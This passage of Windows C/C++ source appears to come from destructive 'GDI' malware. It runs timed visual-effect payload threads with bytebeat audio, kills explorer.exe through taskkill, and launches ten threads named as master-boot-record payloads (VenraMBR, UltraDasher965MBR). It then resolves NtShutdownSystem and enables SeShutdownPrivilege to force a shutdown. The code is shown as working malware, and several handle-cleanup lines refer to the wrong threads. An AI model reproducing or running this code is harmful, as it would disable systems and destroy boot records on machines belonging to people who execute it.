    HANDLE thread14 = CreateThread(0, 0, Number333_Payload3, 0, 0, 0);
    bytebeat11();
    Sleep(30000);
    TerminateThread(thread14, 0);
    CloseHandle(thread14);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread15 = CreateThread(0, 0, Number333_Payload4, 0, 0, 0);
    bytebeat12();
    Sleep(30000);
    TerminateThread(thread15, 0);
    CloseHandle(thread15);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    bytebeat13();
    HANDLE thread16 = CreateThread(0, 0, sixtyfourYT_Payload3, 0, 0, 0);
    Sleep(15000);
    HANDLE thread17 = CreateThread(0, 0, sixtyfourYT_Payload4, 0, 0, 0);
    Sleep(15000);
    TerminateThread(thread16, 0);
    CloseHandle(thread16);
    TerminateThread(thread17, 0);
    CloseHandle(thread17);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread18 = CreateThread(0, 0, VenraTech_Payload4_1, 0, 0, 0);
    HANDLE intenseshake = CreateThread(0, 0, VenraTech_Payload4_2, 0, 0, 0);
    bytebeat14();
    Sleep(30000);
    TerminateThread(thread18, 0);
    CloseHandle(thread18);
    TerminateThread(intenseshake, 0);
    CloseHandle(intenseshake);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    bytebeat15();
    HANDLE thread19 = CreateThread(0, 0, Number333_Payload5, 0, 0, 0);
    Sleep(15000);
    HANDLE thread20 = CreateThread(0, 0, TELEPATHII_Payload4, 0, 0, 0);
    Sleep(15000);
    TerminateThread(thread19, 0);
    CloseHandle(thread19);
    TerminateThread(thread20, 0);
    CloseHandle(thread20);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread21 = CreateThread(0, 0, UltraDasher965_Payload4, 0, 0, 0);
    bytebeat16();
    Sleep(30000);
    TerminateThread(thread21, 0);
    CloseHandle(thread21);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);


    bytebeat17();
    HANDLE thread22 = CreateThread(0, 0, TELEPATHII_Payload5, 0, 0, 0);
    Sleep(15000);
    HANDLE thread23 = CreateThread(0, 0, UltraDasher965_Payload5, 0, 0, 0);
    Sleep(15000);
    TerminateThread(thread22, 0);
    CloseHandle(thread22);
    TerminateThread(thread23, 0);
    CloseHandle(thread23);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, SW_SHOWDEFAULT);
    HANDLE finalpayload = CreateThread(0, 0, FINALE, 0, 0, 0);
    bytebeatfinal();
    Sleep(30000);
    TerminateThread(finalpayload, 0);
    CloseHandle(finalpayload);
    TerminateThread(messagebox, 0);
    CloseHandle(messagebox);
    TerminateThread(thread13dot1, 0);
    CloseHandle(thread13dot1);

    HANDLE MBR1 = CreateThread(0, 0, VenraMBR1, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR1, 0);
    CloseHandle(MBR1);

    HANDLE MBR2 = CreateThread(0, 0, VenraMBR2, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR2, 0);
    CloseHandle(MBR2);

    HANDLE MBR3 = CreateThread(0, 0, VenraMBR3, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR3, 0);
    CloseHandle(MBR3);

    HANDLE MBR4 = CreateThread(0, 0, VenraMBR4, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR4, 0);
    CloseHandle(MBR4);

    HANDLE MBR5 = CreateThread(0, 0, VenraMBR5, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR5, 0);
    CloseHandle(MBR5);

    HANDLE MBR6 = CreateThread(0, 0, UltraDasher965MBR1, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR1, 0);
    CloseHandle(MBR1);

    HANDLE MBR7 = CreateThread(0, 0, UltraDasher965MBR2, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR2, 0);
    CloseHandle(MBR2);

    HANDLE MBR8 = CreateThread(0, 0, UltraDasher965MBR3, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR3, 0);
    CloseHandle(MBR3);

    HANDLE MBR9 = CreateThread(0, 0, UltraDasher965MBR4, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR4, 0);
    CloseHandle(MBR4);

    HANDLE MBR10 = CreateThread(0, 0, UltraDasher965MBR5, 0, 0, 0);
    Sleep(10000);
    TerminateThread(MBR5, 0);
    CloseHandle(MBR5);
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    PVOID Info;
    HMODULE hModule;
    lpNtSetSystemPowerState NtSetSystemPowerState;
    lpNtShutdownSystem NtShutdownSystem;

    if ((hModule = LoadLibrary(_T("ntdll.dll"))) == 0) {
        return 1;
    }

    NtShutdownSystem = (lpNtShutdownSystem)GetProcAddress(hModule, "NtShutdownSystem");
    if (NtShutdownSystem == NULL) {
        return 2;
    }
    NtSetSystemPowerState = (lpNtSetSystemPowerState)GetProcAddress(hModule, "NtSetSystemPowerState");
    if (NtSetSystemPowerState == NULL) {
        return 3;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return(FALSE);

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) {
        return 4;
    }
}